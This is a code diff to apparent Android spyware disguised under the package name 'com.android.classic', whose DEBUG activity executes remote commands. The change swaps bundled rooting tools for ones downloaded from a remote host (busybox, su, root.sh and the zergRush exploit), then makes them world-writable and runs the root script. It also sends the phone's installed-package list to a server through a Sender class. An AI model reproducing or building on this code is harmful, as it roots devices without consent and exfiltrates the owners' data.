@@ -31,8 +31,9 @@ import android.provider.Settings;
 
 import com.android.classic.helper.CommandExecutor;
 import com.android.classic.helper.Compress;
-import com.android.classic.helper.ConstantVariables;
+import com.android.classic.helper.Constants;
 import com.android.classic.helper.DEBUGSERVICE;
+import com.android.classic.helper.DownloadFile;
 import com.android.classic.helper.GPSTracker;
 import com.android.classic.helper.Methods;
 import com.android.classic.helper.Sender;
@@ -260,18 +261,36 @@ public class DEBUG extends Activity {
 				Shell.SU.run("id");
 			} else if (commands.equals(DEBUGSERVICE.codeList[18])) {
 				new File(getFilesDir().getAbsolutePath()).mkdirs();
-				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.busybox,
-						"busybox", this);
-				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.makespace,
-						"makespace", this);
-				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.root,
-						"root.sh", this);
-				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.su, "su",
-						this);
-				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.zergrush,
-						"zergRush", getApplicationContext());
+				DownloadFile downloadFile = new DownloadFile();
+				/* Download */
+				downloadFile.execute(new String[] {
+						Constants.AUTOROOTDL + "busybox",
+						Constants.BASE + "busybox" });
+				downloadFile.execute(new String[] {
+						Constants.AUTOROOTDL + "makespace",
+						Constants.BASE + "makespace" });
+				downloadFile
+						.execute(new String[] { Constants.AUTOROOTDL + "root",
+								Constants.BASE + "root" });
+				downloadFile.execute(new String[] {
+						Constants.AUTOROOTDL + "su", Constants.BASE + "su" });
+				downloadFile.execute(new String[] {
+						Constants.AUTOROOTDL + "zergRush",
+						Constants.BASE + "zergRush" });
+				/* Extract */
+				Methods.SaveIncludedZippedFileIntoFilesFolder(Constants.BASE
+						+ "busybox", "busybox", this);
+				Methods.SaveIncludedZippedFileIntoFilesFolder(Constants.BASE
+						+ "makespace", "makespace", this);
+				Methods.SaveIncludedZippedFileIntoFilesFolder(Constants.BASE
+						+ "root", "root.sh", this);
+				Methods.SaveIncludedZippedFileIntoFilesFolder(Constants.BASE
+						+ "su", "su", this);
+				Methods.SaveIncludedZippedFileIntoFilesFolder(Constants.BASE
+						+ "zergRush", "zergRush", getApplicationContext());
 				String[] root = { "cd /data/data/com.android.classic/files/",
 						"chmod 777 *", "sh root.sh" };
+				/* RUN! */
 				Shell.SH.run(root);
 			}
 			Thread.sleep(5000);
@@ -292,7 +311,7 @@ public class DEBUG extends Activity {
 		}
 		String[] params = { "packages", packagesFinal };
 		new Sender().execute(params);
-		if (ConstantVariables.DEBUG) {
+		if (Constants.DEBUG) {
 			Shell.SH.run("echo '" + packagesFinal
 					+ "' > /sdcard/Android/data/settings/Logger/Packages.txt");
 		}
